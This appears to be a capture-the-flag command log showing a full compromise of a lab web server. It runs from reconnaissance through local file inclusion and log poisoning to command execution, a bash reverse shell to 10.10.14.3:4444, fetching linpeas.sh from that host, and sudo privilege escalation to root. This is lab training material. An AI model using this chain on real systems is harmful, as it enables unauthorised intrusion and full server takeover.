```bash
# ctf command log created 2026-01-28T19:00:00Z

2026-01-28T19:00:05Z	0	/home/user	nmap -sC -sV 10.10.10.10
2026-01-28T19:04:12Z	0	/home/user	nmap -p- 10.10.10.10
2026-01-28T19:09:30Z	0	/home/user	nmap --script vuln 10.10.10.10
2026-01-28T19:14:45Z	0	/home/user	nmap -A 10.10.10.10

2026-01-28T19:21:02Z	0	/home/user	curl http://10.10.10.10
2026-01-28T19:22:18Z	0	/home/user	curl http://10.10.10.10/index.php
2026-01-28T19:24:40Z	0	/home/user	dirb http://10.10.10.10
2026-01-28T19:31:05Z	0	/home/user	gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
2026-01-28T19:44:10Z	0	/home/user	ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt

2026-01-28T20:02:44Z	0	/home/user	curl http://10.10.10.10/index.php?page=home
2026-01-28T20:05:02Z	0	/home/user	curl "http://10.10.10.10/index.php?page=../../../../etc/passwd"
2026-01-28T20:06:21Z	0	/home/user	curl "http://10.10.10.10/index.php?page=../../../../etc/passwd"
2026-01-28T20:07:55Z	0	/home/user	curl "http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=index.php"
2026-01-28T20:10:11Z	0	/home/user	curl "http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=index.php"
2026-01-28T20:15:30Z	0	/home/user	curl "http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=admin.php"

2026-01-28T20:18:12Z	0	/home/user	curl "http://10.10.10.10/index.php?page=/var/log/apache2/access.log"
2026-01-28T20:19:35Z	0	/home/user	curl "http://10.10.10.10/index.php?page=/var/log/apache2/access.log"
2026-01-28T20:21:10Z	0	/home/user	curl "http://10.10.10.10/index.php?page=/var/log/apache2/access.log"

2026-01-28T20:23:40Z	0	/home/user	curl http://10.10.10.10/?cmd=id
2026-01-28T20:24:55Z	0	/home/user	curl http://10.10.10.10/?cmd=whoami
2026-01-28T20:26:12Z	0	/home/user	curl http://10.10.10.10/?cmd=ls

2026-01-28T20:27:48Z	0	/home/user	nc -lvnp 4444
2026-01-28T20:29:20Z	0	/home/user	curl http://10.10.10.10/?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.3/4444+0>%261'

2026-01-28T20:32:05Z	0	/home/user	cd /tmp
2026-01-28T20:32:30Z	0	/home/user	ls -la
2026-01-28T20:33:15Z	0	/home/user	wget http://10.10.14.3/linpeas.sh
2026-01-28T20:34:01Z	0	/home/user	chmod +x linpeas.sh
2026-01-28T20:34:45Z	0	/home/user	./linpeas.sh

2026-01-28T20:52:20Z	0	/home/user	find / -perm -4000 2>/dev/null
2026-01-28T20:54:02Z	0	/home/user	find / -perm -4000 -type f 2>/dev/null

2026-01-28T20:55:40Z	0	/home/user	cd /opt
2026-01-28T20:56:10Z	0	/home/user	ls -la
2026-01-28T20:56:45Z	0	/home/user	cat backup.sh

2026-01-28T20:58:15Z	0	/home/user	sudo -l

2026-01-28T20:59:40Z	0	/home/user	sudo /opt/backup.sh

2026-01-28T21:01:10Z	0	/root	cat /root/root.txt

```
